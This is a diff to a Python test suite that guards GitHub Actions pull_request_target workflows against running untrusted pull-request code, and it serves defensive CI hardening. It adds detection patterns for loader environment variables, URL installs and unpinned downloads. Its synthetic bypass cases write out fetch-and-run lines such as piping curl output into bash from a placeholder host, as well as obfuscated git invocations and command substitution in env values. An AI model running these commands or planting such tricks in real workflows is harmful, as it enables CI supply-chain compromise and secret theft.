@@ -56,6 +56,26 @@ SCRIPT_CONTENT_FETCH = re.compile(
     r"|\b(?:compareCommits|compareCommitsWithBasehead|getCommit|listFiles)\b|\bmediaType\b"
     r"|\bon\s+(?:Blob|Tree)\b|\bobject\s*\(|\bgithub\.request\b|\bfetch\("
     r"|\bhttps?\.(?:get|request)\(|pull_request\.head\b"
+    r"|\b(?:downloadArtifact|downloadJobLogsForWorkflowRun|downloadWorkflowRunLogs)\b"
+    r"|\brequire\(\s*['\"`](?:\.|/)"
+)
+# Environment variables that make a shell, git, or interpreter load code.
+LOADER_ENV = re.compile(
+    r"^(?:BASH_ENV|ENV|PROMPT_COMMAND|NODE_OPTIONS|LD_\w+|DYLD_\w+|GIT_\w+"
+    r"|PYTHON(?:STARTUP|PATH|HOME|INSPECT|USERBASE)|PERL5OPT|PERL5LIB|RUBYOPT|RUBYLIB)$"
+)
+# Event payload fields an action input may use: only the exact base refs.
+EVENT_EXPRESSION = re.compile(r"github\.event\.[\w.]+")
+INPUT_EVENT_FIELDS = {
+    "github.event.pull_request.base.sha",
+    "github.event.merge_group.base_sha",
+    "github.event.merge_group.head_sha",
+}
+# Repository metadata (name, owner, default branch) is not PR-controlled.
+INPUT_EVENT_PREFIXES = ("github.event.repository.",)
+DOWNLOAD_TARGET = re.compile(r"(?:^|\s)(?:-o|--output|-O)\s+[\"']?([^\s\"']+)")
+URL_INSTALL = re.compile(
+    r"\b(?:pip|pip3|uv\s+pip|npm|pnpm|yarn)\s+(?:install|add)\b[^\n]*\b(?:https?://|git\+)"
 )
 # Output of any command piped into an interpreter is executed.
 PIPE_TO_INTERPRETER = re.compile(
@@ -152,6 +172,15 @@ def _top_level_conjuncts(expression: Any) -> list[str] | None:
     conjuncts, depth, start, index = [], 0, 0, 0
     while index < len(text):
         char = text[index]
+        if char == "'":
+            # Skip a quoted string literal ('' escapes a quote inside it).
+            index += 1
+            while index < len(text):
+                if text[index] == "'" and not text.startswith("''", index):
+                    break
+                index += 2 if text.startswith("''", index) else 1
+            index += 1
+            continue
         if char in "([":
             depth += 1
         elif char in ")]":
@@ -226,7 +255,7 @@ def _git_violations(script: str) -> list[str]:
     """Return disallowed git invocations, parsed token by token per command."""
     problems: list[str] = []
     for command in SHELL_SEPARATOR.split(script):
-        tokens = [token.strip("\"'").lstrip("\\") for token in command.split()]
+        tokens = [re.sub(r"[\"'\\]", "", token) for token in command.split()]
         for start, token in enumerate(tokens):
             if token in {"command", "exec", "xargs", "env", "sudo"}:
                 continue
@@ -274,8 +303,13 @@ def _job_violations(
     where: str,
     root: Path | None,
     seen: set[str],
-    bodies: dict[str, str] | None = None,
+    reach: dict[str, Any] | None = None,
+    entry: dict[Any, Any] | None = None,
 ) -> list[str]:
+    # ``entry`` is the top-level pull_request_target workflow: a called
+    # reusable workflow keeps the caller's triggers and github context.
+    entry = workflow if entry is None else entry
+    reach = {"files": set(), "checkout": False} if reach is None else reach
     violations: list[str] = []
     for key in ("container", "services"):
         if job.get(key):
@@ -295,6 +329,7 @@ def _job_violations(
             violations.append(f"{where} calls uninspectable reusable workflow {uses}")
         elif str(callee_path) not in seen:
             seen.add(str(callee_path))
+            reach["files"].add(callee_path)
             callee = _load(callee_path) if callee_path.is_file() else {}
             if not callee:
                 violations.append(f"{where} calls missing reusable workflow {uses}")
@@ -307,7 +342,8 @@ def _job_violations(
                             f"{where}->{uses}:{callee_id}",
                             root,
                             seen,
-                            bodies,
+                            reach,
+                            entry,
                         )
                     )
         return violations
@@ -346,6 +382,7 @@ def _job_violations(
             if manifest is None:
                 violations.append(f"{label} uses missing local action {action_uses}")
                 continue
+            reach["files"].add(manifest)
             runs = _load(manifest).get("runs") or {}
             if runs.get("using") != "composite":
                 violations.append(
@@ -361,6 +398,10 @@ def _job_violations(
         ).items():
             if str(value).strip().rsplit("/", 1)[-1] == "git":
                 violations.append(f"{where} aliases git through env {name}")
+            if LOADER_ENV.match(str(name)):
+                violations.append(f"{where} sets loader environment variable {name}")
+            if "$(" in str(value) or "`" in str(value):
+                violations.append(f"{where} puts command substitution in env {name}")
     # The git allowlist applies to every job in a pull_request_target
     # workflow: the head SHA is always reachable through GITHUB_EVENT_PATH,
     # FETCH_HEAD, or job outputs without naming it in this job.
@@ -405,9 +446,6 @@ def _job_violations(
                 violations.append(
                     f"{label} interpolates an expression into its {key} body; pass it through env"
                 )
-            if bodies is not None:
-                digest = hashlib.sha256(str(body).encode("utf-8")).hexdigest()
-                bodies.setdefault(digest, f"{label} [{key}]")
         if step_uses.startswith("actions/github-script@"):
             body = _normalize((step.get("with") or {}).get("script", ""))
             if SCRIPT_PROCESS.search(body):
@@ -422,8 +460,22 @@ def _job_violations(
                 violations.append(
                     f"{label} downloads foreign artifacts via {sorted(foreign)}"
                 )
+        for field, value in (step.get("with") or {}).items():
+            for expression in EVENT_EXPRESSION.findall(_normalize(value)):
+                if expression not in INPUT_EVENT_FIELDS and not expression.startswith(
+                    INPUT_EVENT_PREFIXES
+                ):
+                    violations.append(
+                        f"{label} feeds event field {expression} into input {field}"
+                    )
+        if (
+            step_uses.startswith("astral-sh/setup-uv@")
+            and str((step.get("with") or {}).get("enable-cache")).lower() != "false"
+        ):
+            violations.append(f"{label} uses setup-uv without enable-cache: false")
         if step_uses.startswith("actions/checkout@"):
-            for problem in _checkout_problems(workflow, job, step):
+            reach["checkout"] = True
+            for problem in _checkout_problems(entry, job, step):
                 violations.append(f"{label} checks out {problem}")
         if step.get("shell") not in (None, "bash"):
             violations.append(f"{label} uses custom shell {step.get('shell')!r}")
@@ -434,8 +486,10 @@ def _job_violations(
             continue
         if GH_CHECKOUT.search(script):
             violations.append(f"{label} runs gh pr checkout/diff")
-        if PIPE_TO_INTERPRETER.search(script):
+        if PIPE_TO_INTERPRETER.search(script) or "<(" in script:
             violations.append(f"{label} pipes command output into an interpreter")
+        if URL_INSTALL.search(script):
+            violations.append(f"{label} installs packages from a URL")
         if FOREIGN_DOWNLOAD.search(script):
             violations.append(
                 f"{label} downloads artifacts or repositories from outside this run"
@@ -447,12 +501,34 @@ def _job_violations(
         for line in script.splitlines():
             if NETWORK_TOOL.search(line) and _shell_names_pr_ref(line, tainted):
                 violations.append(f"{label} downloads PR-head content: {line.strip()}")
-        if NETWORK_TOOL.search(script) and not re.search(
-            r"\bsha256sum\b[^\n]*\s-c\b", script
-        ):
-            # Downloads must be integrity-pinned in the same step; the head SHA
-            # is reachable through GITHUB_EVENT_PATH without naming it.
-            violations.append(f"{label} downloads without a sha256sum -c pin")
+        if NETWORK_TOOL.search(script):
+            # Downloads must be integrity-pinned in the same step, and the pin
+            # must name the downloaded file; the head SHA is reachable through
+            # GITHUB_EVENT_PATH without naming it.
+            check_lines = [
+                line
+                for line in script.splitlines()
+                if re.search(r"\bsha256sum\b[^\n]*\s-c\b", line)
+            ]
+            targets = [
+                target
+                for line in script.splitlines()
+                if NETWORK_TOOL.search(line)
+                for target in (DOWNLOAD_TARGET.findall(line) or ["<stdout>"])
+            ]
+            for target in targets:
+                name = target.strip("${}")
+                spellings = (
+                    {target, f"${name}", f"${{{name}}}"}
+                    if target.startswith("$")
+                    else {target}
+                )
+                if not any(
+                    spelling in line for line in check_lines for spelling in spellings
+                ):
+                    violations.append(
+                        f"{label} downloads {target} without a sha256sum -c pin on it"
+                    )
     return violations
 
 
@@ -460,7 +536,7 @@ def pull_request_target_violations(
     workflow: dict[Any, Any],
     label: str,
     root: Path | None = ROOT,
-    bodies: dict[str, str] | None = None,
+    reach: dict[str, Any] | None = None,
 ) -> list[str]:
     """Flag pull_request_target workflow shapes that can bring PR-head content in.
 
@@ -480,12 +556,13 @@ def pull_request_target_violations(
     if "pull_request_target" not in _triggers(workflow):
         return []
     violations: list[str] = []
+    reach = {"files": set(), "checkout": False} if reach is None else reach
     for job_id, job in (workflow.get("jobs") or {}).items():
         if isinstance(job, dict):
             violations.extend(
-                _job_violations(workflow, job, f"{label}:{job_id}", root, set(), bodies)
+                _job_violations(workflow, job, f"{label}:{job_id}", root, set(), reach)
             )
-    if "actions/checkout@" in str(workflow.get("jobs")):
+    if reach["checkout"]:
         # Checked-out base.sha is "trusted" only if it is protected history.
         on = workflow.get("on", workflow.get(True))
         target = on.get("pull_request_target") if isinstance(on, dict) else None
@@ -505,7 +582,7 @@ def _workflow_files() -> list[Path]:
     return sorted([*WORKFLOWS.glob("*.yml"), *WORKFLOWS.glob("*.yaml")])
 
 
-REVIEWED_BODIES = Path(__file__).with_name("pull_request_target_reviewed_bodies.json")
+REVIEWED_FILES = Path(__file__).with_name("pull_request_target_reviewed_files.json")
 # Pre-existing finding tracked outside this guard's PR: auto-arm-auto-merge.yml
 # runs the tag-pinned actions/create-github-app-token@v2 with the merge-steward
 # App key (follow-up: SHA-pin it). Exact text; once fixed this entry goes stale
@@ -517,17 +594,25 @@ KNOWN_VIOLATIONS = {
 
 
 def _repository_scan() -> tuple[list[str], list[str], dict[str, str]]:
+    """Scan every workflow; return PRT workflows, violations, and the sha256 of
+    every file that defines privileged behaviour (PRT workflows plus every
+    local reusable workflow and composite action they reach)."""
     scanned: list[str] = []
     violations: list[str] = []
-    bodies: dict[str, str] = {}
+    files: dict[str, str] = {}
     for path in _workflow_files():
         workflow = _load(path)
-        if "pull_request_target" in _triggers(workflow):
-            scanned.append(path.name)
+        if "pull_request_target" not in _triggers(workflow):
+            continue
+        scanned.append(path.name)
+        reach: dict[str, Any] = {"files": {path}, "checkout": False}
         violations.extend(
-            pull_request_target_violations(workflow, path.name, bodies=bodies)
+            pull_request_target_violations(workflow, path.name, reach=reach)
         )
-    return scanned, violations, bodies
+        for reached in reach["files"]:
+            relative = Path(reached).resolve().relative_to(ROOT).as_posix()
+            files[relative] = hashlib.sha256(Path(reached).read_bytes()).hexdigest()
+    return scanned, violations, files
 
 
 def test_no_pull_request_target_workflow_checks_out_pull_request_head() -> None:
@@ -540,21 +625,22 @@ def test_no_pull_request_target_workflow_checks_out_pull_request_head() -> None:
     )
 
 
-def test_every_privileged_body_is_reviewed_and_pinned() -> None:
-    """Closed gate: every run/shell/github-script body reachable from a
-    pull_request_target workflow (including composite actions and local
-    reusable workflows) must match a reviewed SHA-256 pin, so new privileged
-    code cannot slip past the pattern rules above without a reviewed pin."""
-    _, _, bodies = _repository_scan()
-    pinned = json.loads(REVIEWED_BODIES.read_text(encoding="utf-8"))["bodies"]
-    unpinned = {
-        digest: where for digest, where in bodies.items() if digest not in pinned
+def test_every_privileged_workflow_file_is_reviewed_and_pinned() -> None:
+    """Closed gate: the exact bytes of every pull_request_target workflow and of
+    every local reusable workflow / composite action it reaches must match a
+    reviewed sha256 pin. Any edit (bodies, env, if, with, triggers, jobs) or any
+    new privileged file fails until it is reviewed and re-pinned; the pattern
+    rules above are defence in depth, not the gate."""
+    _, _, files = _repository_scan()
+    pinned = json.loads(REVIEWED_FILES.read_text(encoding="utf-8"))["files"]
+    changed = {
+        path: digest for path, digest in files.items() if pinned.get(path) != digest
     }
-    stale = sorted(set(pinned) - set(bodies))
-    assert unpinned == {}, (
-        f"review these bodies, then pin their sha256 in {REVIEWED_BODIES.name}"
+    stale = sorted(set(pinned) - set(files))
+    assert changed == {}, (
+        f"review these privileged files, then pin their sha256 in {REVIEWED_FILES.name}"
     )
-    assert stale == [], f"remove stale pins from {REVIEWED_BODIES.name}"
+    assert stale == [], f"remove stale pins from {REVIEWED_FILES.name}"
 
 
 def _prt(steps: list[dict[str, Any]], **job: Any) -> dict[Any, Any]:
@@ -1122,27 +1208,169 @@ def test_detector_rejects_round_ba8544a6_bypasses(workflow: dict[Any, Any]) -> N
     assert pull_request_target_violations(workflow, "synthetic", root=None)
 
 
-def test_privileged_bodies_are_collected_for_the_review_manifest(
-    tmp_path: Path,
-) -> None:
-    action = tmp_path / ".github/actions/inner"
-    action.mkdir(parents=True)
-    (action / "action.yml").write_text(
-        "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo nested\n",
+def test_reach_collects_nested_local_files_and_checkouts(tmp_path: Path) -> None:
+    workflows = tmp_path / ".github/workflows"
+    workflows.mkdir(parents=True)
+    (workflows / "callee.yml").write_text(
+        "on: workflow_call\njobs:\n  c:\n    runs-on: ubuntu-latest\n    steps:\n"
+        "      - uses: ./.github/actions/outer\n",
         encoding="utf-8",
     )
-    bodies: dict[str, str] = {}
-    workflow = _prt([
-        {"run": "echo top"},
-        {
-            "uses": "actions/github-script@" + "0" * 40,
-            "with": {"script": "core.info('x')"},
-        },
-        {"uses": "./.github/actions/inner"},
-    ])
-    pull_request_target_violations(workflow, "synthetic", root=tmp_path, bodies=bodies)
-    digests = {
-        hashlib.sha256(text.encode()).hexdigest()
-        for text in ("echo top", "core.info('x')", "echo nested", "bash")
+    for name, body in {
+        "outer": "    - uses: ./.github/actions/inner\n",
+        "inner": "    - uses: actions/checkout@" + "0" * 40 + "\n",
+    }.items():
+        action = tmp_path / ".github/actions" / name
+        action.mkdir(parents=True)
+        (action / "action.yml").write_text(
+            f"runs:\n  using: composite\n  steps:\n{body}", encoding="utf-8"
+        )
+    reach: dict[str, Any] = {"files": set(), "checkout": False}
+    workflow = {
+        True: {"pull_request_target": {}},
+        "jobs": {"j": {"uses": "./.github/workflows/callee.yml"}},
     }
-    assert digests == set(bodies)
+    violations = pull_request_target_violations(
+        workflow, "synthetic", root=tmp_path, reach=reach
+    )
+    assert reach["checkout"] is True
+    assert {Path(path).relative_to(tmp_path).as_posix() for path in reach["files"]} == {
+        ".github/workflows/callee.yml",
+        ".github/actions/outer/action.yml",
+        ".github/actions/inner/action.yml",
+    }
+    # The nested checkout needs the caller's branch filter.
+    assert any(
+        "not limited to branches: [main]" in violation for violation in violations
+    )
+
+
+_SHA = "0" * 40
+_GUARD_EXPR = '!contains(fromJSON(\'["pull_request_target","pull_request_review"]\'), github.event_name)'
+
+
+@pytest.mark.parametrize(
+    ("workflow", "reason"),
+    [
+        # Review round on 14e28c2a; each case names the rule that must fire.
+        (
+            {
+                True: {"pull_request_target": {}},
+                "jobs": {"j": {"steps": [{"uses": "./.github/actions/co"}]}},
+            },
+            "uninspectable local action",
+        ),
+        (
+            _prt([
+                {
+                    "uses": "actions/upload-artifact@" + _SHA,
+                    "with": {
+                        "name": "x",
+                        "path": "${{ github.event.pull_request.body }}",
+                    },
+                }
+            ]),
+            "feeds event field github.event.pull_request.body",
+        ),
+        (
+            _prt([{"env": {"BASH_ENV": "/tmp/p"}, "run": "true"}]),
+            "loader environment variable BASH_ENV",
+        ),
+        (
+            _prt([{"env": {"GIT_CONFIG_COUNT": "1"}, "run": "true"}]),
+            "loader environment variable GIT_CONFIG_COUNT",
+        ),
+        (
+            _prt([{"env": {"NODE_OPTIONS": "--require ./x.js"}, "run": "true"}]),
+            "loader environment variable NODE_OPTIONS",
+        ),
+        (
+            _prt([{"env": {"X": "$(id)"}, "run": "true"}]),
+            "command substitution in env X",
+        ),
+        (
+            _prt([
+                {"uses": "astral-sh/setup-uv@" + _SHA, "with": {"enable-cache": True}}
+            ]),
+            "setup-uv without enable-cache: false",
+        ),
+        (
+            _prt([
+                {
+                    "uses": "actions/github-script@" + _SHA,
+                    "with": {"script": "require('./payload.js')"},
+                }
+            ]),
+            "fetches repository content in github-script",
+        ),
+        (
+            _prt([
+                {
+                    "uses": "actions/github-script@" + _SHA,
+                    "with": {
+                        "script": "await github.rest.actions.downloadArtifact({owner, repo, artifact_id: 1, archive_format: 'zip'})"
+                    },
+                }
+            ]),
+            "fetches repository content in github-script",
+        ),
+        (_prt([{"run": 'g\\it checkout "$X"'}]), "`git checkout`"),
+        (_prt([{"run": 'gi""t checkout "$X"'}]), "`git checkout`"),
+        (
+            _prt([
+                {
+                    "run": 'echo "a  f" | sha256sum -c -\nbash <(curl -sL https://example.invalid/i.sh)'
+                }
+            ]),
+            "pipes command output into an interpreter",
+        ),
+        (
+            _prt([
+                {
+                    "run": 'curl -sSfL -o payload https://example.invalid/p\necho "a  other" | sha256sum -c -\nbash payload'
+                }
+            ]),
+            "downloads payload without a sha256sum -c pin on it",
+        ),
+        (
+            _prt([{"run": "pip install https://example.invalid/payload.whl"}]),
+            "installs packages from a URL",
+        ),
+        (
+            _prt_review([
+                {
+                    "if": "${{ format('x){0}', true && " + _GUARD_EXPR + " && true) }}",
+                    "uses": "actions/checkout@" + _SHA,
+                    "with": {"ref": "${{ github.sha }}"},
+                }
+            ]),
+            "without the non-PR-event guard",
+        ),
+    ],
+)
+def test_detector_rejects_round_14e28c2a_bypasses(
+    workflow: dict[Any, Any], reason: str
+) -> None:
+    violations = pull_request_target_violations(workflow, "synthetic", root=None)
+    assert any(reason in violation for violation in violations), violations
+
+
+def test_reusable_workflow_keeps_the_callers_merge_ref_triggers(tmp_path: Path) -> None:
+    workflows = tmp_path / ".github/workflows"
+    workflows.mkdir(parents=True)
+    (workflows / "callee.yml").write_text(
+        "on: workflow_call\njobs:\n  c:\n    runs-on: ubuntu-latest\n    steps:\n"
+        "      - uses: actions/checkout@" + _SHA + "\n",
+        encoding="utf-8",
+    )
+    caller = {
+        True: {
+            "pull_request_target": {"branches": ["main"]},
+            "pull_request_review": {},
+        },
+        "jobs": {"j": {"uses": "./.github/workflows/callee.yml"}},
+    }
+    violations = pull_request_target_violations(caller, "synthetic", root=tmp_path)
+    assert any(
+        "without the non-PR-event guard" in violation for violation in violations
+    ), violations
